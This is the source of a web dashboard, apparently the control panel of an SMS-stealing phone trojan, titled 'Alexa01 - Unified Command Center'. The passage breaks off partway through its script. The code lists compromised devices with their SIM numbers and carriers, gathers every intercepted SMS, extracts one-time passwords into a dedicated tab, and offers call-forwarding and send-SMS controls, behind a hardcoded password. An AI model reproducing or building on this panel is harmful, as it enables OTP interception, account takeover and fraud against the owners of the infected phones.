<?php
define('PASSWORD', 'Alexa');
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Alexa01 - Unified Command Center</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#080812;color:#e0e0f0;min-height:100vh;overflow-x:hidden}

/* ---- Animated BG ---- */
.bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;overflow:hidden;pointer-events:none}
.bg-orbs{position:absolute;width:100%;height:100%}
.bg-orbs span{position:absolute;border-radius:50%;opacity:.08;animation:orbFloat 20s infinite ease-in-out}
.bg-orbs span:nth-child(1){width:600px;height:600px;background:radial-gradient(circle,#6c3cf0,transparent);top:-10%;left:-10%;animation-delay:0s}
.bg-orbs span:nth-child(2){width:500px;height:500px;background:radial-gradient(circle,#1a9fff,transparent);bottom:-15%;right:-10%;animation-delay:-7s}
.bg-orbs span:nth-child(3){width:350px;height:350px;background:radial-gradient(circle,#f03c9f,transparent);top:40%;left:60%;animation-delay:-14s}
@keyframes orbFloat{0%,100%{transform:translate(0,0) scale(1)}25%{transform:translate(60px,-40px) scale(1.05)}50%{transform:translate(-30px,60px) scale(.95)}75%{transform:translate(40px,30px) scale(1.02)}}

/* ---- Grid lines ---- */
.bg-grid{position:absolute;top:0;left:0;width:100%;height:100%;background-image:linear-gradient(rgba(108,60,240,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(108,60,240,.03) 1px,transparent 1px);background-size:60px 60px;animation:gridShift 8s linear infinite}
@keyframes gridShift{0%{transform:translate(0,0)}100%{transform:translate(60px,60px)}}

/* ---- Glass ---- */
.glass{background:rgba(255,255,255,.025);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border:1px solid rgba(255,255,255,.05);border-radius:14px;transition:all .3s cubic-bezier(.4,0,.2,1)}
.glass:hover{border-color:rgba(255,255,255,.09);transform:translateY(-1px)}
.glass-s{border-radius:10px}

/* ---- Login ---- */
#loginScr{display:flex;align-items:center;justify-content:center;min-height:100dvh;padding:20px;position:relative;z-index:1}
.login-c{padding:48px 40px;width:380px;max-width:100%;text-align:center;animation:fadeUp .6s ease-out}
.login-c .logo{font-size:40px;font-weight:900;letter-spacing:-2px;background:linear-gradient(135deg,#6c3cf0,#1a9fff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
.login-c .sub{font-size:10px;color:rgba(255,255,255,.25);letter-spacing:4px;text-transform:uppercase;margin-bottom:28px}
.login-c input{width:100%;padding:15px 20px;border:1px solid rgba(255,255,255,.06);border-radius:12px;background:rgba(255,255,255,.03);color:#fff;font-size:14px;font-family:inherit;outline:none;margin-bottom:14px;transition:all .3s}
.login-c input:focus{border-color:rgba(108,60,240,.3);box-shadow:0 0 0 3px rgba(108,60,240,.08)}
.login-c button{width:100%;padding:15px;border:none;border-radius:12px;background:linear-gradient(135deg,#6c3cf0,#4a1fc0);color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:all .3s;font-family:inherit}
.login-c button:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(108,60,240,.2)}
.login-e{color:#f03c6c;font-size:12px;margin-bottom:12px;display:none;padding:8px;background:rgba(240,60,108,.08);border-radius:8px}

/* ---- Header ---- */
.head{padding:20px 28px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,.04);position:relative;z-index:1;flex-wrap:wrap;gap:12px}
.head-l{display:flex;align-items:center;gap:12px}
.head-l .h-logo{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,#6c3cf0,#1a9fff);display:flex;align-items:center;justify-content:center;position:relative}
.head-l .h-logo::after{content:'';width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-radius:4px;transform:rotate(45deg)}
.head-l h1{font-size:20px;font-weight:800;letter-spacing:-.5px;background:linear-gradient(135deg,#6c3cf0,#1a9fff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.head-l .tag{font-size:8px;color:rgba(255,255,255,.2);letter-spacing:3px;text-transform:uppercase;margin-top:-2px}
.head-r{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.h-btn{padding:8px 16px;border-radius:8px;border:1px solid rgba(255,255,255,.06);background:rgba(255,255,255,.03);color:rgba(255,255,255,.6);font-size:11px;cursor:pointer;transition:all .3s;font-family:inherit;font-weight:500}
.h-btn:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.1)}
.h-btn.prim{background:linear-gradient(135deg,#6c3cf0,#4a1fc0);border:none;color:#fff}
.h-btn.prim:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(108,60,240,.2)}
.h-info{font-size:11px;color:rgba(255,255,255,.35);padding:6px 12px;background:rgba(255,255,255,.02);border-radius:6px;border:1px solid rgba(255,255,255,.03)}

/* ---- Stats ---- */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;padding:16px 28px;position:relative;z-index:1}
.s-card{padding:18px 16px;text-align:center;position:relative;overflow:hidden;animation:cardIn .4s ease-out both}
.s-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;border-radius:0 0 2px 2px}
.s-card::after{content:'';position:absolute;top:-40%;left:-40%;width:180%;height:180%;background:radial-gradient(circle,var(--sg) 0%,transparent 60%);opacity:0;transition:opacity .5s}
.s-card:hover::after{opacity:1}
.s-card.tot{--sg:rgba(108,60,240,.08)}.s-card.tot::before{background:linear-gradient(90deg,#6c3cf0,#1a9fff)}
.s-card.on{--sg:rgba(30,200,100,.08)}.s-card.on::before{background:linear-gradient(90deg,#1ec864,#10b060)}
.s-card.off{--sg:rgba(240,60,108,.08)}.s-card.off::before{background:linear-gradient(90deg,#f03c6c,#d03050)}
.s-card.sms{--sg:rgba(240,180,30,.08)}.s-card.sms::before{background:linear-gradient(90deg,#f0b41e,#f08010)}
.s-card.otp{--sg:rgba(240,60,160,.08)}.s-card.otp::before{background:linear-gradient(90deg,#f03ca0,#c03080)}
.s-card:nth-child(1){animation-delay:0s}
.s-card:nth-child(2){animation-delay:.05s}
.s-card:nth-child(3){animation-delay:.1s}
.s-card:nth-child(4){animation-delay:.15s}
.s-card:nth-child(5){animation-delay:.2s}
@keyframes cardIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.s-num{font-size:30px;font-weight:800;line-height:1;margin-bottom:4px}
.s-lbl{font-size:9px;color:rgba(255,255,255,.3);letter-spacing:2px;text-transform:uppercase}
.s-card .s-icon{width:28px;height:28px;margin:0 auto 6px;position:relative}
.s-card .s-icon i{display:block;width:100%;height:100%;border-radius:6px;position:relative}
.s-card.tot .s-icon i{background:linear-gradient(135deg,rgba(108,60,240,.2),rgba(26,159,255,.1));border:1px solid rgba(108,60,240,.15)}
.s-card.tot .s-icon i::after{content:'';position:absolute;top:30%;left:30%;width:40%;height:40%;border:1.5px solid rgba(108,60,240,.3);border-radius:3px;transform:rotate(45deg)}
.s-card.on .s-icon i{background:linear-gradient(135deg,rgba(30,200,100,.2),rgba(16,176,96,.1));border:1px solid rgba(30,200,100,.15)}
.s-card.on .s-icon i::after{content:'';position:absolute;top:35%;left:28%;width:8px;height:14px;border:solid rgba(30,200,100,.3);border-width:0 2px 2px 0;transform:rotate(45deg)}
.s-card.off .s-icon i{background:linear-gradient(135deg,rgba(240,60,108,.2),rgba(208,48,80,.1));border:1px solid rgba(240,60,108,.15)}
.s-card.off .s-icon i::after,.s-card.off .s-icon i::before{content:'';position:absolute;top:28%;left:46%;width:2px;height:44%;background:rgba(240,60,108,.3);border-radius:1px}
.s-card.off .s-icon i::after{transform:rotate(45deg)}
.s-card.off .s-icon i::before{transform:rotate(-45deg)}
.s-card.sms .s-icon i{background:linear-gradient(135deg,rgba(240,180,30,.2),rgba(240,128,16,.1));border:1px solid rgba(240,180,30,.15)}
.s-card.sms .s-icon i::after{content:'';position:absolute;top:22%;left:18%;width:64%;height:56%;border:1.5px solid rgba(240,180,30,.25);border-radius:4px}
.s-card.sms .s-icon i::before{content:'';position:absolute;bottom:18%;right:16%;width:0;height:0;border-left:6px solid transparent;border-right:6px solid transparent;border-top:8px solid rgba(240,180,30,.15);transform:rotate(20deg)}
.s-card.otp .s-icon i{background:linear-gradient(135deg,rgba(240,60,160,.2),rgba(192,48,128,.1));border:1px solid rgba(240,60,160,.15)}
.s-card.otp .s-icon i::after{content:'';position:absolute;top:25%;left:50%;transform:translate(-50%,0);width:10px;height:14px;border:1.5px solid rgba(240,60,160,.25);border-radius:6px 6px 3px 3px}
.s-card.otp .s-icon i::before{content:'';position:absolute;bottom:22%;left:50%;transform:translate(-50%,0);width:6px;height:6px;border-radius:50%;border:1.5px solid rgba(240,60,160,.2)}

/* ---- Tabs ---- */
.tab-bar{display:flex;gap:4px;padding:0 28px;position:relative;z-index:1;overflow-x:auto;scrollbar-width:none}
.tab-bar::-webkit-scrollbar{display:none}
.tab-btn{padding:10px 20px;border-radius:8px 8px 0 0;border:none;background:transparent;color:rgba(255,255,255,.3);font-size:12px;font-weight:500;cursor:pointer;transition:all .3s;font-family:inherit;white-space:nowrap;position:relative}
.tab-btn:hover{color:rgba(255,255,255,.6)}
.tab-btn.active{color:#fff;background:rgba(255,255,255,.03)}
.tab-btn.active::after{content:'';position:absolute;bottom:0;left:20%;width:60%;height:2px;background:linear-gradient(90deg,#6c3cf0,#1a9fff);border-radius:2px}

/* ---- Content ---- */
.content{padding:16px 28px 40px;position:relative;z-index:1}
.tab-p{display:none}
.tab-p.active{display:block}

/* ---- Search / Filters ---- */
.toolbar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
.toolbar input{flex:1;min-width:180px;padding:10px 14px;border:1px solid rgba(255,255,255,.04);border-radius:8px;background:rgba(255,255,255,.025);color:#fff;font-size:12px;font-family:inherit;outline:none;transition:all .3s}
.toolbar input:focus{border-color:rgba(108,60,240,.2);box-shadow:0 0 0 3px rgba(108,60,240,.06)}
.toolbar select{padding:10px 14px;border:1px solid rgba(255,255,255,.04);border-radius:8px;background:rgba(255,255,255,.025);color:rgba(255,255,255,.6);font-size:12px;font-family:inherit;outline:none;cursor:pointer}
.toolbar .f-btn{padding:8px 14px;border:1px solid rgba(255,255,255,.04);border-radius:8px;background:rgba(255,255,255,.02);color:rgba(255,255,255,.4);font-size:11px;cursor:pointer;transition:all .3s;font-family:inherit}
.toolbar .f-btn:hover{background:rgba(255,255,255,.05);color:rgba(255,255,255,.7)}
.toolbar .f-btn.act{border-color:rgba(108,60,240,.2);background:rgba(108,60,240,.08);color:#6c3cf0}
.toolbar .p{font-size:11px;color:rgba(255,255,255,.25);padding:6px 10px}

/* ---- Device Grid ---- */
.d-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px}
.d-card{padding:16px;cursor:pointer;position:relative;overflow:hidden;animation:cardIn .3s ease-out both}
.d-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;border-radius:0 3px 3px 0}
.d-card.on::before{background:linear-gradient(180deg,#1ec864,#10b060)}
.d-card.off::before{background:linear-gradient(180deg,#f03c6c,#d03050)}
.d-card .d-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
.d-card .d-name{font-size:13px;font-weight:600;color:#fff}
.d-card .d-status{font-size:9px;padding:3px 8px;border-radius:4px;font-weight:500;letter-spacing:.5px}
.d-card.on .d-status{background:rgba(30,200,100,.1);color:#1ec864}
.d-card.off .d-status{background:rgba(240,60,108,.1);color:#f03c6c}
.d-card .d-row{display:grid;grid-template-columns:1fr 1fr;gap:4px 12px;font-size:11px;color:rgba(255,255,255,.4)}
.d-card .d-row>div{padding:4px 0;border-top:1px solid rgba(255,255,255,.03)}
.d-card .d-row strong{color:rgba(255,255,255,.7);font-weight:500}
.d-card .d-row .full{grid-column:1/-1}
.d-card .d-bat{margin-top:6px}
.d-card .d-bat .b-bar{height:4px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden}
.d-card .d-bat .b-fill{height:100%;border-radius:2px;transition:width .5s}
.d-card .d-bat .b-fill.hi{background:linear-gradient(90deg,#1ec864,#10b060)}
.d-card .d-bat .b-fill.md{background:linear-gradient(90deg,#f0b41e,#f08010)}
.d-card .d-bat .b-fill.lo{background:linear-gradient(90deg,#f03c6c,#d03050)}
.d-card .d-copy{opacity:0;transition:opacity .2s;margin-left:6px;padding:2px 5px;border-radius:3px;background:rgba(255,255,255,.04);font-size:9px;cursor:pointer}
.d-card:hover .d-copy{opacity:1}
.d-card .d-nums{display:flex;gap:4px;flex-wrap:wrap;margin-top:4px}
.d-card .d-nums .sim-b{padding:2px 8px;border-radius:3px;font-size:9px;font-weight:500}
.sim-jio{background:rgba(30,200,100,.08);color:#1ec864}
.sim-air{background:rgba(26,159,255,.08);color:#1a9fff}
.sim-vi{background:rgba(240,60,160,.08);color:#f03ca0}
.sim-bs{background:rgba(240,180,30,.08);color:#f0b41e}
.sim-oth{background:rgba(255,255,255,.04);color:rgba(255,255,255,.4)}

/* ---- SMS List ---- */
.sms-l{display:flex;flex-direction:column;gap:6px}
.sms-i{padding:12px 14px;animation:cardIn .2s ease-out both}
.sms-i .s-sender{font-size:12px;font-weight:600;color:#fff}
.sms-i .s-via{font-size:9px;color:rgba(255,255,255,.2);margin:2px 0}
.sms-i .s-via .v-link{cursor:pointer;color:rgba(108,60,240,.5);transition:color .2s}
.sms-i .s-via .v-link:hover{color:#6c3cf0}
.sms-i .s-body{font-size:12px;color:rgba(255,255,255,.6);margin:4px 0;line-height:1.4;word-break:break-word}
.sms-i .s-btm{display:flex;gap:8px;align-items:center;font-size:10px;color:rgba(255,255,255,.2)}
.sms-i .s-otp{padding:2px 8px;border-radius:4px;font-weight:600;font-size:11px;cursor:pointer;background:rgba(240,60,160,.08);color:#f03ca0;transition:all .2s}
.sms-i .s-otp:hover{background:rgba(240,60,160,.15)}
.sms-i .s-cp{cursor:pointer;padding:2px 6px;border-radius:3px;background:rgba(255,255,255,.03);transition:all .2s}
.sms-i .s-cp:hover{background:rgba(255,255,255,.06)}
.sms-e{text-align:center;padding:40px 20px;color:rgba(255,255,255,.15);font-size:13px}

/* ---- Modal ---- */
.modal-over{position:fixed;top:0;left:0;width:100%;height:100%;z-index:100;background:rgba(0,0,0,.6);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;padding:20px}
.modal-over.open{display:flex}
.modal-c{width:600px;max-width:100%;max-height:85vh;overflow-y:auto;padding:24px;animation:modalIn .3s ease-out}
@keyframes modalIn{from{opacity:0;transform:scale(.95) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}
.modal-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
.modal-h h2{font-size:18px;font-weight:700}
.modal-h .close{width:32px;height:32px;border-radius:50%;border:none;background:rgba(255,255,255,.04);color:rgba(255,255,255,.3);cursor:pointer;font-size:14px;transition:all .2s;display:flex;align-items:center;justify-content:center}
.modal-h .close:hover{background:rgba(255,255,255,.08);color:#fff}
.modal-tabs{display:flex;gap:2px;margin-bottom:12px;border-bottom:1px solid rgba(255,255,255,.04)}
.modal-tab{padding:8px 16px;border:none;background:transparent;color:rgba(255,255,255,.3);font-size:11px;cursor:pointer;transition:all .2s;font-family:inherit;border-bottom:2px solid transparent}
.modal-tab:hover{color:rgba(255,255,255,.6)}
.modal-tab.act{color:#fff;border-bottom-color:#6c3cf0}
.modal-p{display:none}
.modal-p.act{display:block}

/* ---- Toast ---- */
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);z-index:200;padding:10px 24px;border-radius:8px;font-size:12px;font-weight:500;background:rgba(0,0,0,.7);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,.06);color:#fff;display:none;animation:fadeUp .2s ease-out}
@keyframes fadeUp{from{opacity:0;transform:translateX(-50%) translateY(10px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}

/* ---- Loading ---- */
.load{text-align:center;padding:40px;color:rgba(255,255,255,.15);font-size:12px}
.load .sp{width:24px;height:24px;margin:0 auto 10px;border:2px solid rgba(255,255,255,.04);border-top-color:#6c3cf0;border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

/* ---- Badge pulse ---- */
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.pulse{animation:pulse 2s infinite}
</style>
</head>
<body>
<div class="bg"><div class="bg-grid"></div><div class="bg-orbs"><span></span><span></span><span></span></div></div>

<!-- ====== LOGIN ====== -->
<div id="loginScr">
  <div class="login-c glass">
    <div class="logo">Alexa01</div>
    <div class="sub">Unified Command Center</div>
    <div class="login-e" id="loginE"></div>
    <input id="loginP" type="password" placeholder="Access Key" autocomplete="off">
    <button onclick="doLogin()">Authenticate</button>
  </div>
</div>

<!-- ====== MAIN ====== -->
<div id="mainScr" style="display:none">
  <div class="head">
    <div class="head-l"><div class="h-logo"></div><div><h1>Alexa01</h1><div class="tag">Unified Command Center</div></div></div>
    <div class="head-r">
      <span class="h-info" id="hInfo">--</span>
      <button class="h-btn" onclick="doSync()">⟳ Sync</button>
      <button class="h-btn" onclick="logout()">Logout</button>
    </div>
  </div>

  <div class="stats" id="statsBar">
    <div class="s-card tot glass"><div class="s-icon"><i></i></div><div class="s-num" id="sTot">-</div><div class="s-lbl">Devices</div></div>
    <div class="s-card on glass"><div class="s-icon"><i></i></div><div class="s-num" id="sOn">-</div><div class="s-lbl">Online</div></div>
    <div class="s-card off glass"><div class="s-icon"><i></i></div><div class="s-num" id="sOff">-</div><div class="s-lbl">Offline</div></div>
    <div class="s-card sms glass"><div class="s-icon"><i></i></div><div class="s-num" id="sSms">-</div><div class="s-lbl">SMS</div></div>
    <div class="s-card otp glass"><div class="s-icon"><i></i></div><div class="s-num" id="sOtp">-</div><div class="s-lbl">OTP</div></div>
  </div>

  <div class="tab-bar" id="tabBar">
    <button class="tab-btn active" onclick="switchTab('devices',this)"><span class="tab-ico"></span> Devices</button>
    <button class="tab-btn" onclick="switchTab('sms',this)">All SMS</button>
    <button class="tab-btn" onclick="switchTab('otp',this)">All OTP</button>
    <button class="tab-btn" onclick="switchTab('sims',this)">SIM Numbers</button>
  </div>

  <div class="content">
    <!-- Devices Tab -->
    <div class="tab-p active" id="tDevices">
      <div class="toolbar">
        <input id="sBox" placeholder="Search name, phone, ID, SIM..." oninput="applyFilter()">
        <button class="f-btn act" id="fAll" onclick="setF('all',this)">All</button>
        <button class="f-btn" id="fOn" onclick="setF('online',this)">Online</button>
        <button class="f-btn" id="fOff" onclick="setF('offline',this)">Offline</button>
      </div>
      <div class="d-grid" id="dGrid"></div>
    </div>

    <!-- SMS Tab -->
    <div class="tab-p" id="tSms">
      <div class="toolbar">
        <input id="smsS" placeholder="Search SMS..." oninput="filterSms()">
        <select id="smsDb" onchange="loadSms()"></select>
        <span class="p" id="smsP">-</span>
      </div>
      <div class="sms-l" id="smsL"></div>
    </div>

    <!-- OTP Tab -->
    <div class="tab-p" id="tOtp">
      <div class="toolbar">
        <input id="otpS" placeholder="Search OTP..." oninput="filterOtp()">
        <span class="p" id="otpP">-</span>
      </div>
      <div class="sms-l" id="otpL"></div>
    </div>

    <!-- SIM Numbers Tab -->
    <div class="tab-p" id="tSims">
      <div class="toolbar">
        <input id="simS" placeholder="Search number..." oninput="filterSims()">
        <button class="f-btn" id="fsAll" onclick="setSimF('all',this)">All</button>
        <button class="f-btn" id="fsOn" onclick="setSimF('online',this)">Online Only</button>
        <span class="p" id="simP">-</span>
      </div>
      <div class="d-grid" id="simGrid"></div>
    </div>
  </div>
</div>

<!-- Modal -->
<div class="modal-over" id="modalOver">
  <div class="modal-c glass">
    <div class="modal-h"><h2 id="modalT"></h2><button class="close" onclick="closeModal()">&#x2715;</button></div>
    <div class="modal-tabs" id="modalTabs">
      <button class="modal-tab act" onclick="switchMT('info',this)">Info</button>
      <button class="modal-tab" onclick="switchMT('sms',this)">SMS</button>
      <button class="modal-tab" onclick="switchMT('fwd',this)">Call Fwd</button>
      <button class="modal-tab" onclick="switchMT('send',this)">Send SMS</button>
    </div>
    <div class="modal-p act" id="mInfo"></div>
    <div class="modal-p" id="mSms"></div>
    <div class="modal-p" id="mFwd"></div>
    <div class="modal-p" id="mSend"></div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
var DEV = {}, IDX = {}, DLIST = [], FILTER = 'all', SIMF = 'all', SMS_CACHE = [], OTP_CACHE = [], SIMS_CACHE = [];
var MID = '', MDB = '', MSMS = [];
var polling = null;

function api(a, p, d) {
  var u = 'api.php?action=' + encodeURIComponent(a) + '&pwd=Alexa', o = {};
  if (p) Object.keys(p).forEach(function(k) { u += '&' + encodeURIComponent(k) + '=' + encodeURIComponent(p[k]) });
  if (d) { o.method = 'POST'; var fd = new FormData(); Object.keys(d).forEach(function(k) { fd.append(k, d[k]) }); o.body = fd }
  return fetch(u, o).then(function(r) { if (!r.ok) return null; return r.json() }).catch(function() { return null });
}

function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') }

function copy(t) { navigator.clipboard.writeText(t).then(function() { show('Copied') }) }

function show(m) { var t = document.getElementById('toast'); t.textContent = m; t.style.display = 'block'; setTimeout(function() { t.style.display = 'none' }, 2000) }

// ====== AUTH ======
function doLogin() {
  var p = document.getElementById('loginP').value;
  api('login', null, { password: p }).then(function(d) {
    if (d && d.ok) { document.getElementById('loginScr').style.display = 'none'; document.getElementById('mainScr').style.display = 'block'; doSync(); }
    else { document.getElementById('loginE').textContent = 'Access Denied'; document.getElementById('loginE').style.display = 'block' }
  }).catch(function() { document.getElementById('loginE').textContent = 'Connection Failed'; document.getElementById('loginE').style.display = 'block' })
}
document.getElementById('loginP').addEventListener('keydown', function(e) { if (e.key === 'Enter') doLogin() });
document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal() });

function logout() { document.getElementById('mainScr').style.display = 'none'; document.getElementById('loginScr').style.display = 'flex'; document.getElementById('loginP').value = ''; if (polling) clearInterval(polling) }

// ====== SYNC ======
function doSync() {
  document.getElementById('hInfo').textContent = 'Syncing...';
  api('sync').then(function(d) {
    if (!d || !d.devices) {
      document.getElementById('dGrid').innerHTML = '<div class="load"><div class="sp"></div>Connection Error</div>';
      document.getElementById('hInfo').textContent = 'Error';
      return;
    }
    DEV = d.devices; IDX = d.index || {};
    DLIST = Object.keys(DEV).map(function(id) { return { id: id, dev: DEV[id] } });
    var on = 0, off = 0;
    DLIST.forEach(function(i) { if (i.dev.status === 'online') on++; else off++ });
    document.getElementById('sTot').textContent = DLIST.length;
    document.getElementById('sOn').textContent = on;
    document.getElementById('sOff').textContent = off;
    document.getElementById('hInfo').textContent = DLIST.length + ' devices';
    applyFilter();
    // Populate DB dropdown (serial numbers)
    var dbs = {};
    Object.keys(IDX).forEach(function(id) { dbs[IDX[id]] = 1 });
    var sel = document.getElementById('smsDb'), cur = sel.value;
    var dbList = Object.keys(dbs).sort();
    sel.innerHTML = '<option value="">All DBs</option>';
    dbList.forEach(function(n, i) { sel.innerHTML += '<option value="' + esc(n) + '">' + (i+1) + '</option>' });
    sel.value = '';
    loadSms();
  }).catch(function() {
    document.getElementById('dGrid').innerHTML = '<div class="load"><div class="sp"></div>Sync Failed</div>';
    document.getElementById('hInfo').textContent = 'Error';
  });
}

// ====== DEVICES TAB ======
function applyFilter() {
  var q = document.getElementById('sBox').value.toLowerCase();
  var list = DLIST;
  if (FILTER === 'online') list = list.filter(function(i) { return i.dev.status === 'online' });
  else if (FILTER === 'offline') list = list.filter(function(i) { return i.dev.status !== 'online' });
  if (q) list = list.filter(function(i) { return (i.id + ' ' + ph(i.dev) + ' ' + (i.dev.d_name||'') + ' ' + sn(i.dev) + ' ' + (i.dev.numberSim1||'') + ' ' + (i.dev.numberSim2||'')).toLowerCase().includes(q) });
  var html = '';
  list.forEach(function(i) {
    var dev = i.dev, id = i.id, p = ph(dev) || '-', st = dev.status || 'offline', b = parseInt(dev.battery||dev.battery_level||0) || 0;
    var model = dev.d_name || dev.Device_Name || 'Device';
    var nm = sn(dev), n1 = dev.numberSim1 || '', n2 = dev.numberSim2 || '';
    var bc = b > 50 ? 'hi' : b > 20 ? 'md' : 'lo';
    var si = simOp(nm || p);
    html += '<div class="d-card glass ' + st + '" onclick="openD(\'' + esc(id) + '\')">'
      + '<div class="d-top"><div class="d-name">' + esc(model) + '</div><div class="d-status">' + st + '</div></div>'
      + '<div class="d-row"><div>Phone: <strong>' + esc(p) + '</strong><span class="d-copy" onclick="event.stopPropagation();copy(\'' + esc(p) + '\')">Copy</span></div>'
      + '<div>Battery: <strong>' + b + '%</strong></div>';
    if (n1) html += '<div>SIM1: <strong>' + esc(n1) + '</strong><span class="d-copy" onclick="event.stopPropagation();copy(\'' + esc(n1) + '\')">Copy</span></div>';
    if (n2) html += '<div>SIM2: <strong>' + esc(n2) + '</strong><span class="d-copy" onclick="event.stopPropagation();copy(\'' + esc(n2) + '\')">Copy</span></div>';
    if (nm) html += '<div>Operator: <strong>' + esc(nm) + '</strong></div>';
    html += '<div class="full">ID: <span style="font-size:10px;opacity:.4">' + esc(id) + '</span></div></div>';
    if (nm || p) html += '<div class="d-nums">' + (p ? '<span class="sim-b ' + si + '">' + esc(nm||p) + '</span>' : '') + '</div>';
    html += '<div class="d-bat"><div class="b-bar"><div class="b-fill ' + bc + '" style="width:' + b + '%"></div></div></div></div>';
  });
  if (!list.length) html = '<div class="sms-e">No devices match your filter</div>';
  document.getElementById('dGrid').innerHTML = html;
}

function setF(f, btn) {
  FILTER = f;
  document.querySelectorAll('.toolbar .f-btn').forEach(function(b) { b.classList.remove('act') });
  if (btn) btn.classList.add('act');
  applyFilter();
}

function ph(d) {
  var f = ['phoneNumber','number','numberSim1','sim1','sim1Number','PhoneNumber','phone','mobile','number1','simNumber','mobNo','sim','numberSim2','sim2','sim2Number'];
  for (var i = 0; i < f.length; i++) { var v = (d[f[i]]||'').trim(); if (v && v !== 'Not Available' && v !== 'No Data' && v !== 'No SIM Found' && v !== 'Unknown' && v !== '' && v !== 'Restricted') return v }
  return '';
}

function sn(d) {
  var f = ['nameSim1','name1','sim1Name','sim1Carrier','sim2Carrier','operator1','nameSim','simName','simOperator','operator','carrierName','nameSim2','sim2Name'];
  for (var i = 0; i < f.length; i++) { var v = (d[f[i]]||'').trim(); if (v && v !== 'Not Available' && v !== 'No Data' && v !== 'Unknown' && v !== '' && v !== 'Restricted') return v }
  return '';
}

function simOp(s) {
  var l = s.toLowerCase();
  if (l.includes('jio')||l.includes('ril')||l.includes('reliance')) return 'sim-jio';
  if (l.includes('airtel')||l.includes('air')) return 'sim-air';
  if (l.includes('vi')||l.includes('vodafone')||l.includes('idea')) return 'sim-vi';
  if (l.includes('bsnl')||l.includes('bs')) return 'sim-bs';
  return 'sim-oth';
}

// ====== ALL SMS ======
function loadSms() {
  var c = document.getElementById('smsL'), p = document.getElementById('smsP'), db = document.getElementById('smsDb').value;
  p.textContent = 'Loading...';
  c.innerHTML = '<div class="load"><div class="sp"></div></div>';
  api('all_sms', { db: db || '' }).then(function(all) {
    if (!all) all = [];
    var seen = {};
    SMS_CACHE = all.filter(function(s) { var k = s.body + '_' + s.sender + '_' + (s._dev||''); if (seen[k]) return false; seen[k] = 1; return true });
    SMS_CACHE.sort(function(a, b) { return (b.timestamp||b.date||0) - (a.timestamp||a.date||0) });
    document.getElementById('sSms').textContent = SMS_CACHE.length;
    filterSms();
    buildSims();
    p.textContent = SMS_CACHE.length + ' SMS' + (db ? ' from ' + db : '');
  }).catch(function() { c.innerHTML = '<div class="sms-e">Load Failed</div>' });
}

function filterSms() {
  var q = document.getElementById('smsS').value.toLowerCase();
  var all = SMS_CACHE;
  if (q) all = all.filter(function(s) { return (s.body||'').toLowerCase().includes(q) || (s.sender||'').toLowerCase().includes(q) });
  var html = '', lim = Math.min(all.length, 500);
  for (var i = 0; i < lim; i++) {
    var m = all[i], b = m.body || '', o = extOtp(b);
    var dv = '', di = m._dev || '';
    if (DEV[di]) dv = DEV[di].d_name || DEV[di].Device_Name || 'Device';
    html += '<div class="sms-i glass"><div class="s-sender">' + esc(m.sender||'Unknown') + '</div>'
      + '<div class="s-via">via <span class="v-link" onclick="closeModal();openD(\'' + esc(di) + '\')">' + esc(dv||di.slice(0,12)) + '</span> [' + (m._db||'') + ']</div>'
      + '<div class="s-body">' + esc(b) + '</div><div class="s-btm"><span>' + fmt(m.date||m.timestamp) + '</span>'
      + (o ? '<span class="s-otp" onclick="copy(\'' + esc(o) + '\')">' + esc(o) + '</span>' : '')
      + '<span class="s-cp" onclick="copy(\'' + esc(b) + '\')">Copy</span></div></div>';
  }
  if (all.length > lim) html += '<div class="sms-e">Showing ' + lim + ' of ' + all.length + '</div>';
  if (!all.length) html = '<div class="sms-e">' + (q ? 'No matches' : 'No SMS found') + '</div>';
  document.getElementById('smsL').innerHTML = html;
  buildOtps();
}

// ====== OTP ======
function buildOtps() {
  if (!SMS_CACHE.length) { OTP_CACHE = []; filterOtp(); document.getElementById('sOtp').textContent = '0'; return }
  var seen = {};
  OTP_CACHE = SMS_CACHE.filter(function(s) {
    var otp = extOtp(s.body||''); if (!otp) return false;
    var k = otp + '_' + (s._dev||''); if (seen[k]) return false; seen[k] = 1; s._otp = otp; return true;
  });
  filterOtp();
  document.getElementById('sOtp').textContent = OTP_CACHE.length;
}

function filterOtp() {
  var q = document.getElementById('otpS').value.toLowerCase();
  var all = OTP_CACHE;
  if (q) all = all.filter(function(s) { return (s._otp||'').includes(q) || (s.body||'').toLowerCase().includes(q) });
